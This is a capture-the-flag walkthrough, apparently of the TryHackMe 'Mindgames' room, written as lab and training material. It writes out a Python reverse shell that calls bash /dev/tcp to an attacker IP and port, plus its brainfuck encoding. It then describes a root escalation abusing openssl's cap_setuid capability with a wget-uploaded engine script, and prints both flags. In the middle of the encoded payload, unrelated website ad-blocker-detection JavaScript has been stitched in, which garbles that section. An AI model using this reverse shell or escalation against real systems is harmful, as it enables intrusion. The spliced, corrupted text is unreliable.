# writeups
--namp==
```
22/tcp   open     ssh        syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 244f06260ed37cb8184240127a9e3b71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c2b3c56fd602ff728344755d6f88dc1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da168b14aa580ee174856fafbf6b8d58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp   open     http       syn-ack     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9001/tcp filtered tor-orport no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

===mindgames website comment===

```
 <!-- That's a lie, I enjoyed making this. -->
```

```
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
```
it's brainfuck program language a quite search, and I also found a website to write or unwrite
`https://www.tutorialspoint.com/execute_brainfk_online.php`, and this one are most recommend
`https://www.dcode.fr/brainfuck-language`, so I also notice that when you pass a brainfuck line
it shows you some python syntax, that mean the code behind execute some python script, doing some seach
I see we can try an reverseShell by python;

```
import os

os.system(‘bash -c “bash -i >& /dev/tcp/10.8.91.36/1234 0>&1”’)
```
myscript before to convert in brainfuck,

`import oso…"')++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-----.++++.<<<..>>>----.++++.<<++++++++++++++.>>.++++++.------.+.---------------.++++++++.<<------.-.>>-----------.-.++++++++++++++++++.-----------.<<-------.+++++++++++++.>>-----.<<-------------.++.>>-.-.++++++++++++++++++.-----------.<<--.+++++++++++++.>>+.<<-------------.>--------.<++++++.------.+++++++++++++++.>>-----.+.+++++++++++++++++.<<.>>--.-----------------.+++++++++++++.<<.++.-.--.>------.<.>+.<+++.---.+++++.+++.-------.++.+.+.+.--------------------.>---------.++++++++++++++.<++++++.+++++++++++.---------------.+++++.++.var left_space = document.getElementById('logo').getBoundingClientRect().left;if (left_space > 100) { var js_info = '- Report <a href=\'javascript:show_contact_form()\'>a problem</a><br/>- Suggest <a href=\'javascript:show_contact_form()\'>an improvement or an idea</a><br/>- Ask for <a href=\'javascript:show_contact_form()\'>explanations</a>.'; $('#results').qtip({ content:{text:js_info},position:{my:'top right',at:'top left'},hide:{fixed:true,delay:500,inactive:3000},style:{width:left_space,tip:{corner:'right middle'}}});}#h15823bf{position:fixed !important;position:absolute;top:23px;top:expression((t=document.documentElement.scrollTop?document.documentElement.scrollTop:document.body.scrollTop)+'px');left:16px;width:91%;height:93%;background-color:#fff;opacity:.90;filter:alpha(opacity=90);display:block;padding:20% 0}#h15823bf{text-align:center;margin:0 auto;display:block;filter:none;font:bold 1.25em Verdana,Arial,sans-serif;text-decoration:none}#h15823bf small {font: 0.85em Verdana;} #h15823bf ~ *{display:none}(function(l,m){ function n(a){a&&h15823bf.nou();}var h=l.document; var p=['i','s'];//if (window.dCode.adBlock??true) $.ajax({async:0,url:'/static/ads/ad_service.js',dataType:'script'}).fail(function(){window.dCode.adBlock=true;}).done(function(){window.dCode.adBlock=false;});n.prototype={rand:function(a){return Math.floor(Math.random()*a)},getElementBy:function(a,b){return a?h.getElementById(a):h.getElementsByTagName(b)},getStyle:function(a){var b=h.defaultView;return b&&b.getComputedStyle?b.getComputedStyle(a,null):a.currentStyle},deferExecution:function(a){setTimeout(a,'.1214.')},insert:function(a,b){var e=h.createElement('div'),c=h.body,d=c.childNodes.length,g=c.style,f=0,k=0;if('h15823bf'==b){e.setAttribute('id',b);g.margin=g.padding=0;g.height='100%';for(d=this.rand(d);f<d;f++)1==c.childNodes[f].nodeType&&(k=Math.max(k,parseFloat(this.getStyle(c.childNodes[f]).zIndex)||0));k&&(e.style.zIndex=k+1);d++}e.innerHTML=a;c.insertBefore(e,c.childNodes[d-1])},r:function(a){var b=h.body.style;this.getElementBy(a).parentNode.removeChild(this.getElementBy(a));b.height=b.margin=b.padding=''},aoj:function(a){a='abiuq'.charAt(this.rand(4));this.insert('<'+a+'>Oops! Issue detected!<br><br> <small>Something is blocking dCode and prevent it to load correctly.</small><br><br> 1/ Check connection status and/or browser update<br><br> 2/ Whitelist <code>dcode.fr</code> and/or disable your ad-blocker <small>(<a target=\"_blank\" href=\"https://www.wikihow.com/Disable-Your-Ad-Blocker\">How?</a>)</small><br><br> Thank You<br><br>'+('<input type="button" onclick="h15823bf.r(\'h15823bf\')" value="OK"></'+a+'>'),'h15823bf')},i:function(){for(var a='ad,ads,adsense,criteo'.split(','),b=a.length,e='',c=this,d=0,g='abiuq'.charAt(c.rand(4));d<b;d++)c.getElementBy(a[d])||(e+='<'+g+' id="'+a[d]+'"></'+g+'>');c.insert(e);c.deferExecution(function(){for(d=0;d<b;d++)if(null==c.getElementBy(a[d]).offsetParent||'none'==c.getStyle(c.getElementBy(a[d])).display||(window.dCode.adBlock||false))return c.aoj('#'+a[d]+'('+d+')');c.nou()})},s:function(){var a={'pagead2.googlesyndic':'google_ad_client'},b=this,e=b.getElementBy(0,'script'),c=e.length-1,d,g,f,k;h.write=null;for(h.writeln=null;0<=c;--c)if(d=e[c].src.substr(7,20),a[d]!==m){f=h.createElement('script');f.type='text/javascript';f.src=e[c].src;g=a[d];l[g]=m;f.onload=f.onreadystatechange=function(){k=this;l[g]!==m||k.readyState&&'loaded'!==k.readyState&&'complete'!==k.readyState||(l[g]=f.onload=f.onreadystatechange=null,e[0].parentNode.removeChild(f))};e[0].parentNode.insertBefore(f,e[0]);b.deferExecution(function(){if(l[g]===m)return b.aoj(f.src);b.n`
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-----.++++.<<<..>>>----.++++.<<++++++++++++++.>>.++++++.------.+.---------------.++++++++.<<------.-.>>-----------.-.++++++++++++++++++.-----------.<<-------.+++++++++++++.>>-----.<<-------------.++.>>-.-.++++++++++++++++++.-----------.<<--.+++++++++++++.>>+.<<-------------.>--------.<++++++.------.+++++++++++++++.>>-----.+.+++++++++++++++++.<<.>>--.-----------------.+++++++++++++.<<.++.-.--.>------.<.>+.<+++.---.+++++.+++.-------.++.+.+.+.--------------------.>---------.++++++++++++++.<++++++.+++++++++++.---------------.+++++.++.
``` 
and here the result after brainfuck it, and after paste it into the mindgames websit and make my nc session
for the revshell, I got the shell, navigate to my user, and here the 1st flag

`thm{411f7d38247ff441ce4e134b459b6268}`, sudo don't work, no crontab, no strange file, so 
trying to get some capabilities(I could use linpeas to help me but I prefer work like that)  and I got

```
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```
 the ssl one, it's a good one when I explore payloadAllTheThings,and when you see *ep* that
mean the cap has all the capabilities available, what I gonna doing next I got it from my writeups

`https://tonyrahmos.medium.com/mindgames-tryhackme-writeup-1fc9e08e45da`


to prevent some error `openssl/engine.h` not found I was too install this 

```
sudo apt-get install libssl-dev
```
after that the script worked, and I upload the script in the victim box by wget, and
execute this

`openssl req -engine <scriptDir>` after a while os spectating a bunch of errors, I finally
did it, root session

https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/, this resource
helps me better to understand more what I was doing, and here we go to the 2nd flag

`thm{1974a617cc84c5b51411c283544ee254}`
